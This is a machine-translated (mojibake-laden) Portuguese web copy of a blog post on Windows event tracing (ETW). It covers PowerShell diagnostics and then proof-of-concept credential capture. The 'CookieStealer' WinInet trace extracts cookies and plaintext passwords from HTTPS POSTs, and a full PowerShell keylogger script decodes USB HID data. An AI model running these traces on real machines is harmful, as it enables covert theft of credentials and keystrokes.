<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§∞üèø üöÅ üè´ O rastreamento de eventos para Windows est√° do lado ruim. Mas isso n√£o √© certo üêµ üëµüèº üí¶</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Nos artigos anteriores sobre o sniffer do PowerShell e a coleta de dados de inicializa√ß√£o de um servidor remoto, eu j√° escrevi um pouco sobre os recur...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>O rastreamento de eventos para Windows est√° do lado ruim. Mas isso n√£o √© certo</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pc-administrator/blog/418787/"><p><img src="https://habrastorage.org/webt/ii/h9/zh/iih9zhmwsn9nofzy8rkouzp4yry.jpeg"></p><br><p>  Nos artigos anteriores sobre <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">o sniffer do PowerShell</a> e a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">coleta de dados de inicializa√ß√£o de um servidor remoto,</a> eu j√° escrevi um pouco sobre os recursos do ETW (Event Tracing for Windows).  Hoje eu quero falar mais sobre essa tecnologia. </p><br><p>  Ao mesmo tempo, demonstrarei o uso do HTTPS e a cria√ß√£o de um keylogger no PowerShell como um exemplo de como ele pode ser usado para sempre.  Ou n√£o realmente para o bem. <a name="habracut"></a></p><br><h1 id="rabota-s-etw">  Trabalhar com ETW </h1><br><p>  O Rastreamento de Eventos para Windows coleta e envia mensagens de componentes do sistema Windows e aplicativos de terceiros.  Ele apareceu nos dias do Windows 2000, mas se naquela √©poca havia v√°rias d√∫zias de fornecedores de sistemas, agora a pontua√ß√£o j√° est√° na casa das centenas.  As mensagens s√£o convenientemente usadas para diagnosticar erros e resolver problemas de desempenho do software. </p><br><p> Alguns provedores de sistema j√° gravam no log de eventos do Windows por padr√£o, e alguns s√£o inclu√≠dos separadamente.  Portanto, mesmo se voc√™ n√£o conhece o ETW, provavelmente o usa.  Voc√™ pode se familiarizar com os logs e ativar alguns deles, se necess√°rio, no visualizador de eventos padr√£o nos logs de aplicativos e servi√ßos.  Um pouco sobre a revista e sobre como trabalhar com ela pode ser encontrado no artigo " <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Giramos os logs como queremos - an√°lise dos logs nos sistemas Windows</a> ". </p><br><p>  <strong>Voc√™ pode visualizar a lista de provedores existentes</strong> que est√£o felizes em nos dizer o que est√° acontecendo com eles com o comando <strong>logman query provider</strong> . </p><br><p><img src="https://habrastorage.org/webt/l1/pj/bk/l1pjbkjfufxvyqp5ro4xv4qjyne.jpeg"></p><br><p>  <em>Fornecedores ETW.</em> </p><br><p>  Voc√™ pode visualizar a lista de provedores que est√£o conectados a um processo espec√≠fico do Windows (e, portanto, aprender algo sobre isso) usando o <strong>comando logman query provider -pid &lt;process PID&gt;.</strong> </p><br><p><img src="https://habrastorage.org/webt/f2/q3/is/f2q3is7egt-nmq70kkeoijqvrp0.jpeg"></p><br><p>  <em>Lista de provedores conectados a um notebook comum.</em> </p><br><p>  <strong>Voc√™</strong> pode habilitar a <strong>assinatura de eventos de um</strong> provedor espec√≠fico ou rastrear atrav√©s do PowerShell usando o <strong>cmdlet New-NetEventSession</strong> .  E voc√™ pode at√© clicar com o mouse no caminho "Gerenciamento do computador" - "Desempenho" - "Grupo de coletores de dados".  Aqui, nas sess√µes de rastreamento de eventos, voc√™ pode ver quais rastreios est√£o em execu√ß√£o e criar seu pr√≥prio coletor, se desejar. </p><br><p><img src="https://habrastorage.org/webt/gh/bx/qe/ghbxqepwh2ilmzzul7khowlivgo.jpeg"></p><br><p>  <em>Executando tra√ßos.</em> </p><br><p>  <strong>Voc√™ pode visualizar o resultado</strong> usando utilit√°rios e conjuntos de utilit√°rios, como o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Microsoft Message Analyzer</a> , o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Windows Performance Toolkit</a> ou mesmo o <strong>cmdlet</strong> PowerShell <strong>Get-WinEvent</strong> . </p><br><p>  Eu recomendo que voc√™ leia os recursos do ETW na documenta√ß√£o da Microsoft, voc√™ pode come√ßar com a se√ß√£o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Sobre o rastreamento de eventos</a> .  Tamb√©m posso recomendar um bom material " <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Estudamos ETW e extra√≠mos lucros</a> ". </p><br><p>  Como o ETW opera no n√≠vel do kernel, ele se distingue pela velocidade de transfer√™ncia de mensagens e pela aus√™ncia da necessidade de instalar qualquer driver ou injetar nos aplicativos.  Normalmente, os ETWs s√£o usados ‚Äã‚Äãpara diagnosticar problemas de desempenho e aplicativos.  Por exemplo, o artigo ‚Äú <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Acelerando a inicializa√ß√£o do Windows por divers√£o e lucro</a> ‚Äù analisa fatores que influenciam a lentid√£o do carregamento, e no artigo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">CPU de 24 n√∫cleos e n√£o consigo mover o mouse</a> - os motivos para a lentid√£o do Windows em opera√ß√µes comuns.  Deixe-me dar um exemplo - a an√°lise da execu√ß√£o de cmdlets do PowerShell. </p><br><h1 id="sledim-za-powershell">  Assistindo ao PowerShell </h1><br><p>  Suponha que, de alguma maneira (por exemplo, por meio de uma auditoria de inicializa√ß√µes de processos), voc√™ descubra que processos arrastados e scripts do PowerShell est√£o em execu√ß√£o no seu computador.  Uma t√©cnica ser√° usar ETWs para analisar sua atividade.  Por exemplo, observe o provedor do PowerShell.  Ative o rastreamento com o comando: </p><br><pre><code class="bash hljs">logman start pstrace -p Microsoft-Windows-PowerShell -oc:\temp\pstrace.etl -ets</code> </pre> <br><p>  Agora vamos esperar at√© que os scripts incompreens√≠veis funcionem, pare o rastreamento com o comando: </p><br><pre> <code class="bash hljs">logman stop pstrace -ets</code> </pre><br><p>  Agora voc√™ pode ver o rastreamento, por exemplo, atrav√©s do Microsoft Message Analyzer. </p><br><p><img src="https://habrastorage.org/webt/3i/3j/7u/3i3j7uamctkk9-pd23lmtizdjcs.jpeg"></p><br><p>  <em>O arquivo clean.ps1 suspeito, obviamente, procura e exclui algo.</em> </p><br><p>  Se voc√™ selecionar a linha desejada, no painel inferior haver√° informa√ß√µes estendidas sobre o evento. </p><br><p><img src="https://habrastorage.org/webt/xk/tx/3t/xktx3thdkpitn0bueqhlaqmfx1k.jpeg"></p><br><p>  <em>Ah, esse √© o mesmo script para <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">limpar o</a> cache 1C!</em> </p><br><p>  Desta vez, tudo acabou sendo banal.  Mas, em casos mais complexos, voc√™ pode executar um rastreamento para verificar outras atividades: </p><br><ul><li>  atividade de rede; </li><li>  Resolu√ß√£o DNS </li><li>  acesso ao disco; </li><li>  trabalhar com mem√≥ria; </li><li>  Atividade WMI </li><li>  e muito mais </li></ul><br><p>  Dessa forma, a ETW pode ajudar a capturar malware e entender como os aplicativos funcionam.  Em alguns lugares, isso √© mais informativo que o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Process Monitor comum</a> .  Mas, al√©m de boas a√ß√µes, o mecanismo tem um lado "sombrio". </p><br><blockquote>  Claro, voc√™ pode matar com um martelo e salvar com uma arma.  Obviamente, n√£o farei uma avalia√ß√£o moral dos mecanismos, mas, em qualquer caso, oportunidades interessantes se abrir√£o. </blockquote><p>  Vou dar alguns exemplos como prova de conceito </p><br><h1 id="s--znachit-beeezopasno">  S significa seguro </h1><br><p>  Neste exemplo, mostrarei como √© f√°cil descobrir o que um usu√°rio est√° procurando na Internet, mesmo atrav√©s de HTTPS.  Voc√™ pode v√™-lo sem o PowerShell - apenas um mouse, apenas hardcore.  Em nossa tarefa, haver√° um usu√°rio, haver√° Windows, Internet Explorer e um log de eventos. </p><br><p>  Vamos come√ßar ativando o log de eventos do Wininet.  Isso √© feito da seguinte maneira: abra o log de eventos, na guia "View", ative a exibi√ß√£o de logs anal√≠ticos e de depura√ß√£o. </p><br><p><img src="https://habrastorage.org/webt/fu/de/q0/fudeq02mmzhunyyw1cwib0ou8pm.jpeg"></p><br><p>  <em>Adicione a exibi√ß√£o dos logs desejados.</em> </p><br><p>  Depois disso, ative o UsageLog no menu de contexto, e isso √© suficiente para obter as informa√ß√µes necess√°rias.  Vamos usar o IE e ver o log: </p><br><p><img src="https://habrastorage.org/webt/pj/mu/ja/pjmujaesudek77i77sv0vtnnnjc.jpeg"></p><br><p>  <em>Revista WinInet.</em> </p><br><p>  Na verdade, os cabe√ßalhos das revistas e uma solicita√ß√£o direta ao mecanismo de pesquisa s√£o vis√≠veis. </p><br><p>  Al√©m dos cabe√ßalhos, voc√™ tamb√©m pode usar o di√°rio para extrair cookies e, ao mesmo tempo, ver solicita√ß√µes POST - por exemplo, para extrair credenciais.  A t√©cnica funciona em qualquer aplicativo que use wininet.dll para trabalhar com a Internet.  Por exemplo, o navegador Edge. </p><br><p>  O mesmo √© facilmente implementado no PowerShell e at√© no cmd.  Vou dar um exemplo de implementa√ß√£o por √∫ltimo. </p><br><p>  Primeiro, crie um rastreio: </p><br><pre> <code class="bash hljs">logman start CookieStealer -p Microsoft-Windows-WinInet -oc:\temp\cookiesteal.etl -ets</code> </pre><br><p>  Agora vamos trabalhar no navegador, verifique o correio.  O rastreamento pode ent√£o ser parado com o comando: </p><br><pre> <code class="bash hljs">logman stop CookieStealer -ets</code> </pre><br><p>  A an√°lise mais simples pode ser feita usando o utilit√°rio de comando <strong>wevtutil.exe</strong> .  Por exemplo, para visualizar solicita√ß√µes POST, o comando seria: </p><br><pre> <code class="bash hljs">wevtutil qe c:\temp\cookiesteal.etl /lf:<span class="hljs-literal"><span class="hljs-literal">true</span></span> /f:Text | find /i <span class="hljs-string"><span class="hljs-string">"POST"</span></span></code> </pre><br><p>  Voc√™ pode at√© tentar aleatoriamente procurar a palavra <em>senha</em> e obter o resultado. </p><br><p><img src="https://habrastorage.org/webt/yg/yk/gd/ygykgdj9vmqmlp7aobfcz5fyyiu.jpeg"></p><br><p>  <em>Senhas em texto simples.</em>  <em>Muito chato.</em> </p><br><p>  Vale ressaltar que o antiv√≠rus ficou silencioso ao mesmo tempo.  De fato, este √© um processo de rastreamento normal. </p><br><p>  Obviamente, os eventos WinInet tamb√©m podem ser usados ‚Äã‚Äãpara diagnosticar problemas como "por que este site n√£o abre e o que acontece".  No entanto, as possibilidades s√£o bastante interessantes.  Volto-me para um exemplo ainda mais distorcido. </p><br><h1 id="keylogger-na-powershell-potomu-chto-mogu">  Keylogger no PowerShell.  Porque eu posso. </h1><br><p>  Existem dois provedores de ETW interessantes no Windows: </p><br><ul><li><p>  <strong>Microsoft-Windows-USB-UCX</strong> (36DA592D-E43A-4E28-AF6F-4BC57C5A11E8) - funciona com USB 2.0. </p><br></li><li><p>  <strong>Microsoft-Windows-USB-USBPORT</strong> (C88A4EF5-D048-4013-9408-E04B7DB2814A) - funciona com USB 3.0. </p><br></li></ul><br><p>  Com a ajuda deles, voc√™ pode obter os dados HID transferidos por um dispositivo USB, como teclado ou mouse.  Os dados s√£o capturados em bruto, mas, gra√ßas √† <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">especifica√ß√£o</a> HID <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">,</a> podem ser facilmente lidos. </p><br><p>  Para iniciar o rastreio, basta executar os seguintes comandos: </p><br><pre> <code class="bash hljs">logman start <span class="hljs-string"><span class="hljs-string">"usbtrace"</span></span> -p <span class="hljs-string"><span class="hljs-string">"microsoft-windows-usb-usbport"</span></span> -o <span class="hljs-string"><span class="hljs-string">"c:\temp\usbtrace.etl"</span></span> -ets</code> </pre><br><p>  E os dados podem ser obtidos com o cmdlet do PowerShell: </p><br><pre> <code class="hljs mel">$Input=get-winevent ‚Äìpath <span class="hljs-string"><span class="hljs-string">"c:\temp\usbtrace.etl"</span></span> ‚Äìoldest | where {$_.message ‚Äì<span class="hljs-keyword"><span class="hljs-keyword">match</span></span> <span class="hljs-string"><span class="hljs-string">"Data"</span></span>}</code> </pre><br><p>  Vou dar um exemplo de um script simples que l√™ dados de rastreamento e os converte em valores leg√≠veis.  A convers√£o √© feita apenas para letras em ingl√™s e exclusivamente em letras mai√∫sculas. </p><br><div class="spoiler">  <b class="spoiler_title">Lista completa do script sob o spoiler.</b> <div class="spoiler_text"><pre> <code class="hljs powershell"><span class="hljs-variable"><span class="hljs-variable">$source</span></span> = <span class="hljs-string"><span class="hljs-string">"C:\temp\trace.etl"</span></span> <span class="hljs-variable"><span class="hljs-variable">$destination</span></span>= <span class="hljs-string"><span class="hljs-string">"C:\temp\Output.txt"</span></span> <span class="hljs-variable"><span class="hljs-variable">$tracetime</span></span> = <span class="hljs-string"><span class="hljs-string">"10"</span></span> logman start usbtrace <span class="hljs-literal"><span class="hljs-literal">-p</span></span> microsoft<span class="hljs-literal"><span class="hljs-literal">-windows</span></span><span class="hljs-literal"><span class="hljs-literal">-usb</span></span><span class="hljs-literal"><span class="hljs-literal">-usbport</span></span> <span class="hljs-literal"><span class="hljs-literal">-o</span></span> <span class="hljs-variable"><span class="hljs-variable">$source</span></span> <span class="hljs-literal"><span class="hljs-literal">-ets</span></span> sleep <span class="hljs-variable"><span class="hljs-variable">$TraceTime</span></span> logman stop usbtrace <span class="hljs-literal"><span class="hljs-literal">-ets</span></span> <span class="hljs-variable"><span class="hljs-variable">$Input</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">get-winevent</span></span> ‚Äìpath <span class="hljs-variable"><span class="hljs-variable">$Source</span></span> ‚Äìoldest | where {<span class="hljs-variable"><span class="hljs-variable">$_</span></span>.message ‚Äìmatch <span class="hljs-string"><span class="hljs-string">"Data"</span></span>} <span class="hljs-variable"><span class="hljs-variable">$HID</span></span> = <span class="hljs-keyword"><span class="hljs-keyword">Foreach</span></span> (<span class="hljs-variable"><span class="hljs-variable">$I</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-variable"><span class="hljs-variable">$Input</span></span>) {(<span class="hljs-string"><span class="hljs-string">'{0:x}'</span></span> <span class="hljs-operator"><span class="hljs-operator">-f</span></span> (<span class="hljs-variable"><span class="hljs-variable">$I</span></span>.properties.value[<span class="hljs-number"><span class="hljs-number">5</span></span>]))} <span class="hljs-variable"><span class="hljs-variable">$Data</span></span>=<span class="hljs-keyword"><span class="hljs-keyword">switch</span></span> (<span class="hljs-variable"><span class="hljs-variable">$HID</span></span>) { <span class="hljs-number"><span class="hljs-number">4</span></span> {<span class="hljs-string"><span class="hljs-string">"A"</span></span>} <span class="hljs-number"><span class="hljs-number">5</span></span> {<span class="hljs-string"><span class="hljs-string">"B"</span></span>} <span class="hljs-number"><span class="hljs-number">6</span></span> {<span class="hljs-string"><span class="hljs-string">"C"</span></span>} <span class="hljs-number"><span class="hljs-number">7</span></span> {<span class="hljs-string"><span class="hljs-string">"D"</span></span>} <span class="hljs-number"><span class="hljs-number">8</span></span> {<span class="hljs-string"><span class="hljs-string">"E"</span></span>} <span class="hljs-number"><span class="hljs-number">9</span></span> {<span class="hljs-string"><span class="hljs-string">"F"</span></span>} A {<span class="hljs-string"><span class="hljs-string">"G"</span></span>} B {<span class="hljs-string"><span class="hljs-string">"H"</span></span>} C {<span class="hljs-string"><span class="hljs-string">"I"</span></span>} D {<span class="hljs-string"><span class="hljs-string">"J"</span></span>} E {<span class="hljs-string"><span class="hljs-string">"K"</span></span>} F {<span class="hljs-string"><span class="hljs-string">"L"</span></span>} <span class="hljs-number"><span class="hljs-number">10</span></span> {<span class="hljs-string"><span class="hljs-string">"M"</span></span>} <span class="hljs-number"><span class="hljs-number">11</span></span> {<span class="hljs-string"><span class="hljs-string">"N"</span></span>} <span class="hljs-number"><span class="hljs-number">12</span></span> {<span class="hljs-string"><span class="hljs-string">"O"</span></span>} <span class="hljs-number"><span class="hljs-number">13</span></span> {<span class="hljs-string"><span class="hljs-string">"P"</span></span>} <span class="hljs-number"><span class="hljs-number">14</span></span> {<span class="hljs-string"><span class="hljs-string">"Q"</span></span>} <span class="hljs-number"><span class="hljs-number">15</span></span> {<span class="hljs-string"><span class="hljs-string">"R"</span></span>} <span class="hljs-number"><span class="hljs-number">16</span></span> {<span class="hljs-string"><span class="hljs-string">"S"</span></span>} <span class="hljs-number"><span class="hljs-number">17</span></span> {<span class="hljs-string"><span class="hljs-string">"T"</span></span>} <span class="hljs-number"><span class="hljs-number">18</span></span> {<span class="hljs-string"><span class="hljs-string">"U"</span></span>} <span class="hljs-number"><span class="hljs-number">19</span></span> {<span class="hljs-string"><span class="hljs-string">"V"</span></span>} <span class="hljs-number"><span class="hljs-number">1</span></span>A {<span class="hljs-string"><span class="hljs-string">"W"</span></span>} <span class="hljs-number"><span class="hljs-number">1</span></span>B {<span class="hljs-string"><span class="hljs-string">"X"</span></span>} <span class="hljs-number"><span class="hljs-number">1</span></span>C {<span class="hljs-string"><span class="hljs-string">"Y"</span></span>} <span class="hljs-number"><span class="hljs-number">1</span></span>D {<span class="hljs-string"><span class="hljs-string">"Z"</span></span>} } <span class="hljs-variable"><span class="hljs-variable">$Data</span></span> | <span class="hljs-built_in"><span class="hljs-built_in">out-file</span></span> <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$Destination</span></span></span><span class="hljs-string">"</span></span> <span class="hljs-built_in"><span class="hljs-built_in">get-content</span></span> <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$Destination</span></span></span><span class="hljs-string">"</span></span> del <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$source</span></span></span><span class="hljs-string">"</span></span> del <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$Destination</span></span></span><span class="hljs-string">"</span></span></code> </pre> </div></div><br><p>  Quando iniciado, o script ativa o rastreamento por 10 segundos e mostra o resultado. </p><br><p><img src="https://habrastorage.org/webt/w1/kg/ag/w1kgag36huygrqilju8ngooidx8.jpeg"></p><br><p>  <em>O resultado do script.</em> </p><br><p>  Obviamente, depois de entender os dados HID, voc√™ pode refinar o script para um keylogger completo que registra dados do teclado e do mouse.  Vale ressaltar as limita√ß√µes deste mecanismo: </p><br><ul><li>  s√≥ funciona com USB e o PS \ 2 (como √†s vezes √© encontrado em laptops) n√£o √© suportado; </li><li>  O suporte ao USB 3.0 √© anunciado apenas no Windows 8 e superior; </li><li>  Direitos de administrador (UAC) necess√°rios. </li></ul><br><p>  Mas n√£o h√° motoristas e interceptadores.  Bem, √© claro, al√©m do uso malicioso, esse keylogger pode ajudar a diagnosticar problemas com o teclado.  Teoricamente. </p><br><h1 id="nuzhno-li-boyatsya">  Preciso ter medo </h1><br><p>  At√© os mecanismos embutidos nas m√£os do vil√£o podem causar problemas.  Os m√©todos de prote√ß√£o permanecem os mesmos: bloqueie arquivos execut√°veis ‚Äã‚Äãque n√£o pertencem aos diret√≥rios do sistema, n√£o funcione como usu√°rio com privil√©gios de administrador e, se funcionar, pelo menos n√£o desative o UAC.  E, √© claro, os navegadores internos do Windows em termos de seguran√ßa levantam quest√µes. </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt418787/">https://habr.com/ru/post/pt418787/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt418777/index.html">‚ÄúN√£o h√° chefe aqui‚Äù: sobre como trabalhar com c√≥digo-fonte aberto e Apache Ignite na Sberbank Technologies</a></li>
<li><a href="../pt418779/index.html">Caixa com base no tablet: por que os varejistas da rede precisam dela (contamos no exemplo da nossa caixa)</a></li>
<li><a href="../pt418781/index.html">Adicione criptografia de email e assinatura eletr√¥nica ao Zimbra</a></li>
<li><a href="../pt418783/index.html">"Quem ontem foi um gigante monop√≥lio, amanh√£ pode se tornar nada." Entrevista com Evgeny Chereshnev da Biolink.Tech</a></li>
<li><a href="../pt418785/index.html">Amigo tudo. Agora √© oficial</a></li>
<li><a href="../pt418789/index.html">Uber para de desenvolver caminh√µes n√£o tripulados</a></li>
<li><a href="../pt418791/index.html">Or√°culos, ou por que contratos inteligentes ainda n√£o mudaram o mundo?</a></li>
<li><a href="../pt418793/index.html">PDper EXpert - Especialista em distribui√ß√£o de energia</a></li>
<li><a href="../pt418795/index.html">An√°lise do ASUS ROG GM501 Zephyrus M</a></li>
<li><a href="../pt418797/index.html">Erros canhotos de projetos de TI ao entrar no mercado nos EUA</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>